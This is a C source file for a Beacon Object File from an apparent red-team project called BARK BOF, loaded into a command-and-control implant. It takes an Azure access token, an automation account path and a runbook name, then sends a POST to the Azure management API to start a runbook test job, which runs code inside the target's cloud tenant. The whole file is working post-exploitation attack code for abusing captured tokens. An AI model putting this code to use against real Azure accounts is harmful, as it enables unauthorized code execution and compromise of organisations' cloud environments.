/*
 * get_azure_automation_account_runbook_output.c - BARK BOF
 * Get-AzureAutomationAccountRunBookOutput - Start a runbook test job
 *
 * Args : token, automationAccountPath, runbookName
 *
 * Author : BARK BOF project
 * License: GPLv3
 */
#include <windows.h>
#include <winhttp.h>
#include "../../include/beacon.h"
#include "../../include/http_utils.h"

void go(char *args, int alen)
{
    datap  parser;
    char   pathBuf[1024];
    LPWSTR widePath = NULL;
    char  *token = NULL, *aaPath = NULL, *rbName = NULL;

    BeaconDataParse(&parser, args, alen);
    token  = BeaconDataExtract(&parser, NULL);
    aaPath = BeaconDataExtract(&parser, NULL);
    rbName = BeaconDataExtract(&parser, NULL);

    if (!token || MSVCRT$strlen(token) == 0) {
        BeaconPrintf(CALLBACK_ERROR,
            "[-] Usage: bark_get_azure_automation_account_runbook_output "
            "<token> <aaPath> <runbookName>\n");
        return;
    }

    MSVCRT$sprintf_s(pathBuf, sizeof(pathBuf),
        "%s/runbooks/%s/draft/testJob?api-version=2017-05-15-preview", aaPath, rbName);
    widePath = MbsToWcs(pathBuf);
    if (!widePath) { BeaconPrintf(CALLBACK_ERROR, "[-] Path conversion failed\n"); return; }

    BeaconPrintf(CALLBACK_OUTPUT,
        "[*] Get-AzureAutomationAccountRunBookOutput: starting test job for %s\n"
        "    Poll GET %s to check status.\n", rbName, pathBuf);

    BarkPost(L"management.azure.com", widePath, L"POST",
             "{\"runOn\":\"\",\"parameters\":{}}", token, "application/json");
    HFree(widePath);
}
